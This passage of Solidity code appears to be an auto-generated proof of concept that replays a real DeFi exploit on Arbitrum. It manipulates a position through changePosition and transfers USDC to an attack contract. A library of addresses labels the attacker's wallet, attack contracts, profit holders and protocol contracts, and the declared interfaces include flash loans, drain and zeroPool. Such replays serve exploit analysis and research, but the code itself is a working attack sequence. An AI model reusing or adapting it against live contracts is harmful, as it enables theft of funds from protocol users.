                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
                    .changePosition(int256(0), int256(-894992852305), int256(0));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount = 894992852305;
            {
                if (Addresses.USDC_5CC8.code.length != 0) {
                    IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_contract_6CB5, transferActionGraphAmount);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _handleFlashLoanCa4() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant USDC = 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8; // Addresses.USDC = 0x1efb3f88bc88f03fd1804a5c53b7141bbef5ded8 label=ArbFiatToken token_symbol=USDC roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant attack_contract = 0x21EdA2e3ad975Fde9c81769E15Ed8e1532eB08a4; // Addresses.attack_contract = 0x21eda2e3ad975fde9c81769e15ed8e1532eb08a4 label=attack_contract roles=attacker_contract|attacker_entry_contract|code_contract|contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attack_contract_6CB5 = 0x348DF930E825Da25552D8B3dc44e871c67846CB5; // Addresses.attack_contract_6CB5 = 0x348df930e825da25552d8b3dc44e871c67846cb5 label=attack_contract roles=asset|attacker_callback_contract|attacker_contract|attacker_surface_contract|code_contract|contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant A_625E77_B4CD = 0x625E7708f30cA75bfd92586e17077590C60eb4cD; // Addresses.A_625E77_B4CD = 0x625e7708f30ca75bfd92586e17077590c60eb4cd label=0x625e7708f30ca75bfd92586e17077590c60eb4cd roles=economic_holder|attack_address|profit_holder|recipient|sender|storage_contract source=asset_delta.profit_candidates confidence=medium
    address internal constant A_6749D7_6707 = 0x6749D795bb40Ddf00a953f618CEddA7440216707; // Addresses.A_6749D7_6707 = 0x6749d795bb40ddf00a953f618cedda7440216707 label=unresolved roles=attack_address|recipient source=unresolved confidence=low
    address internal constant A_794A61_14AD = 0x794a61358D6845594F94dc1DB02A252b5b4814aD; // Addresses.A_794A61_14AD = 0x794a61358d6845594f94dc1db02a252b5b4814ad label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1; // Addresses.WETH = 0x82af49447d8a07e3bd95bd0d56f35241523fbab1 label=TransparentUpgradeableProxy token_symbol=WETH roles=asset|contract|attack_address|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant RKA = 0x8b194bEae1d3e0788A1a35173978001ACDFba668; // Addresses.RKA = 0x8b194beae1d3e0788a1a35173978001acdfba668 label=aeWETH token_symbol=RKA roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant attack_child = 0x8c6be2E20306dD1eC40A7E76f40310943953bA7f; // Addresses.attack_child = 0x8c6be2e20306dd1ec40a7e76f40310943953ba7f label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant A_B309BF_AB83 = 0xb309bf4e2747B885D8C3ee2e078E6EAADFcdaB83; // Addresses.A_B309BF_AB83 = 0xb309bf4e2747b885d8c3ee2e078e6eaadfcdab83 label=unresolved roles=asset|contract source=unresolved confidence=low
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
    address internal constant attacker_eoa = 0xbF6EC059F519B668a309e1b6eCb9a8eA62832d95; // Addresses.attacker_eoa = 0xbf6ec059f519b668a309e1b6ecb9a8ea62832d95 label=attacker_eoa roles=attacker_eoa|contract|economic_holder|attack_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant UniswapV3Pool = 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443; // Addresses.UniswapV3Pool = 0xc31e54c7a869b9fcbecc14363cf510d1c41fa443 label=UniswapV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attack_child_7BEB = 0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb; // Addresses.attack_child_7BEB = 0xea09ea354009818776d41f8e2a9dcdfc9c4e7beb label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attack_child_6635 = 0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635; // Addresses.attack_child_6635 = 0xf1b426708d6ecf02274a789bbc10a94a1b5a6635 label=attack_child roles=asset|attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant A_F7CA73_80BC = 0xF7CA7384cc6619866749955065f17beDD3ED80bC; // Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant USDC_5CC8 = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8; // Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=attack_address source=unresolved confidence=low
}

interface IContract_794A61_14AD {
    function flashLoanSimple(address, address, uint256, bytes calldata, uint16) external;
}

interface IContract_F7CA73_80BC {
    function changePosition(int256, int256, int256) external;
    function longPosition() external view;
    function updateFunding() external;
}

interface Iattack_child {
    function zeroPool() external;
}

interface Iattack_child_6635 {
    function drain() external;
    function openPosition() external;
}

interface Iattack_contract_6CB5 {
    function run() external;
}
